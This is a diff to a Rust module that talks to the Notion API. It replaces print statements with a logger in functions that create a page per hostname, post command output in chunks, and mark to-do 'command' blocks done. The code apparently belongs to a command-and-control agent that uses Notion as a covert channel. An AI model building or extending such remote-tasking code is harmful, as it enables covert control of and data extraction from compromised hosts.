@@ -2,6 +2,7 @@ use reqwest::Client;
 use serde_json::json;
 
 use crate::config::{URL_BASE, ConfigOptions};
+use crate::logger::Logger;
 
 /// This is a Noation limitation
 const CHUNK_SIZE: usize = 2000;
@@ -12,8 +13,8 @@ const CHUNK_SIZE: usize = 2000;
 /// 
 /// Notion still has a limit of 100 children per block, so the effective limit of
 /// the output size, without multiple blocks, is 2MiB.
-pub async fn send_result(client: &Client, command_block_id: &str, output: String) {
-    println!("{output}");
+pub async fn send_result(client: &Client, command_block_id: &str, output: String, logger: &Logger) {
+    logger.debug(format!("{output}"));
     let chunks:Vec<serde_json::Value> = output
         .as_bytes()
         .chunks(CHUNK_SIZE)
@@ -44,7 +45,8 @@ pub async fn send_result(client: &Client, command_block_id: &str, output: String
         .unwrap();
     
     if !r.status().is_success() {
-        println!("{}",r.text().await.unwrap());
+        let result_text = r.text().await.unwrap();
+        logger.debug(result_text);
     }
 }
 
@@ -52,8 +54,8 @@ pub async fn send_result(client: &Client, command_block_id: &str, output: String
 /// 
 /// The returned value is the id of the new page, to be used with
 /// `doc::get_blocks()`
-pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
-    println!("[+] Creating page...");
+pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String, logger: &Logger) -> Option<String> {
+    logger.info(format!("Creating page..."));
     let url = format!("{}/pages/", URL_BASE);
     
     // Craft JSON Body
@@ -81,7 +83,8 @@ pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostna
         let res_body = r.json::<serde_json::Value>().await.unwrap();
         return Some(String::from(res_body["id"].as_str()?));
     }
-    println!("{}",r.text().await.unwrap());
+    let result_text = r.text().await.unwrap();
+    logger.debug(result_text);
     None
 }
 
@@ -107,7 +110,7 @@ pub async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json:
 }
 
 /// Marks a job done by making the to-do item checked.
-pub async fn complete_command(client: &Client, mut command_block: serde_json::Value) {
+pub async fn complete_command(client: &Client, mut command_block: serde_json::Value, logger: &Logger) {
     
     // Set completed status
     command_block["to_do"]["checked"] = serde_json::to_value(true).unwrap();
@@ -121,6 +124,7 @@ pub async fn complete_command(client: &Client, mut command_block: serde_json::Va
         .unwrap();
 
     if !r.status().is_success() {
-        println!("{}",r.text().await.unwrap());
+        let result_text = r.text().await.unwrap();
+        logger.debug(result_text);
     }
 }
